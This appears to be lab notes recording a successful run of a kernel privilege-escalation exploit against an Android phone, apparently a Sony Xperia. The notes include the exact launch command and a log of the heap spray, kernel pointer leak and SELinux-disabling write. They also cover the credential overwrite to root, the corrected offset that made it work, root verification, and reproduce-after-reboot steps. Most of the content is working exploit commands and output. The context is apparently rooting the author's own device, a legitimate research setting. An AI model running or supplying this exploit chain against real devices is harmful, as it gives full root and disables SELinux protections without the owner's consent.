# The Winning Run — stage by stage

Command:

```bash
adb shell "/data/local/tmp/ghostlock_native \
    --load-prebuilt-profile /data/local/tmp/xperia_profile_v4.bin --force-attack"
```

Profile: `xperia_profile_v4.bin` — compiled programmatically from
`ghostlock-extract --format json` (zero hand-entered values). Route:
**select_stack**, waiter_shift = 1.

## Timeline (from `native_v4.log` / `sample-success.log`)

```
T+0:00  heap spray start
T+0:01  futex collisions found
T+0:01  mm_struct leaked=0xffffff88c49a1800          ← valid kernel pointer
T+0:01  prepare_kernel_page ok attempt=1             ← page verified on first try
T+0:01  pselect route: page=...c49a0000 fake_lock/fake_w0/fake_task laid out
T+0:10  pselect route done calls=1 success=1 status=0 clean=1/1 errno=0

        W1: SELinux attempt 1/15
        target=0xffffff802a25a448                    ← 0x225A448, CORRECT address
[+]     SELinux permissive
[+]     Write 1 complete

        W2: cred = init_cred
[+]     child is root!            (child uid = 0)
[-]     no app seccomp filter (adb/shell flow); skipping W3
[*]     exploit complete

        handoff: root script /data/local/tmp/.ghostlock_root.sh
        root shell worker pid=... (uid 0)
        ksud=/data/app/.../com.resukisu.resukisu.../libksud.so
        iomem cache: cached 13583 bytes
        policyload before=0 after=2   (SELinux policy fixup rc=0)
        late-load kmi=android14-6.1 exit=0
[+]     KernelSU module loaded
[+]     KernelSU ready
```

Total: ~12 s from launch to exploit-complete.

## Why this run succeeded where 30+ earlier runs failed

The W1 target address. Every earlier hand-built profile carried
`selinux_enforcing = 0x225B448` (+0x1000). W1 was writing 0 into an unused
word inside the selinux state — the races were genuinely clean, the write was
genuinely landing, and SELinux was genuinely untouched. The v4 profile took
every value from the extractor's JSON output; W1 landed on its first attempt.

## Verified post-state

```bash
$ adb shell su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0

$ adb shell su -c getenforce
Enforcing
```

- KernelSU kernel-side active (loaded module, ksu SELinux context works while
  Enforcing — the exploit window's permissive state was closed again by ksud)
- ksud 4.2.0-rc3 installed at `/data/adb/ksud` (busybox, bootctl, resetprop)
- ReSukiSU manager (`com.resukisu.resukisu`) = grant UI
- adb shell (uid 2000) auto-trusted; normal apps need one manual grant in the
  manager's Superuser tab (resets on reboot along with everything else)

## Reproducing after a reboot

```bash
adb shell "/data/local/tmp/ghostlock_native \
    --load-prebuilt-profile /data/local/tmp/xperia_profile_v4.bin --force-attack"
```

~50% landing rate per boot. If it exits without `[+] KernelSU ready` (or the
phone panics — harmless), reboot and try again. Success criteria: the log ends
with `KernelSU ready` and `adb shell su -c id` returns uid 0.

## Artifacts

| Artifact | Location |
|---|---|
| Exploit binary | this folder (`ghostlock_native`), phone `/data/local/tmp/` |
| Profile | this folder (`xperia_profile_v4.bin`), phone `/data/local/tmp/` |
| Success log | this folder (`sample-success.log`) |
| Extractor JSON (offset ground truth) | `Desktop/ghostlock-app-set/profile/xperia_extracted.json` |
| ksud session log (phone) | `/data/local/tmp/.ghostlock_ksu.log` |
